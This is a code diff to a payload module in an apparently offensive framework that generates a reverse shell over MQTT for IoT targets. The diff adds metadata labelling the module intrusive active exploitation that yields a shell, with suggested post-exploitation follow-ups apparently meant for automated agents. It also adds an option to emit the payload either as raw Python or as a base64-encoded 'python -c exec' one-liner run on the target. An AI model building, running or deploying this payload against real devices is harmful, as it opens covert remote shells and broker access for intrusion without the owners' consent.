@@ -22,6 +22,19 @@ class Module(Payload):
 		"listener": "listeners/iot/reverse_mqtt_shell",
 		"handler": Handler.REVERSE,
 		"session_type": SessionType.POLLING,
+		"tags": ["iot", "mqtt", "c2"],
+		"agent": {
+			"risk": "intrusive",
+			"effects": ["active_exploitation"],
+			"produces": ["risk_signals"],
+			"chain": {
+				"produces_capabilities": ["shell", "mqtt_access"],
+				"suggested_followups": [
+					"post/mqtt/gather/topic_dump",
+					"post/mqtt/gather/broker_audit",
+				],
+			},
+		},
 	}
 
 	lhost = OptString("127.0.0.1", "MQTT broker host", True)
@@ -31,6 +44,12 @@ class Module(Payload):
 	username = OptString("", "Broker username", False)
 	password = OptString("", "Broker password", False)
 	python_binary = OptString("python3", "Python on target", True)
+	output_format = OptChoice(
+		"oneliner",
+		"oneliner = python -c exec; script = raw Python source",
+		False,
+		choices=["oneliner", "script"],
+	)
 
 	def generate(self):
 		identity = None
@@ -53,6 +72,11 @@ class Module(Payload):
 			username=str(self.username or ""),
 			password=str(self.password or ""),
 		)
+		fmt = str(
+			getattr(getattr(self, "output_format", None), "value", self.output_format) or "oneliner"
+		).strip().lower()
+		if fmt == "script":
+			return script
 		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
 		py = str(self.python_binary)
 		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
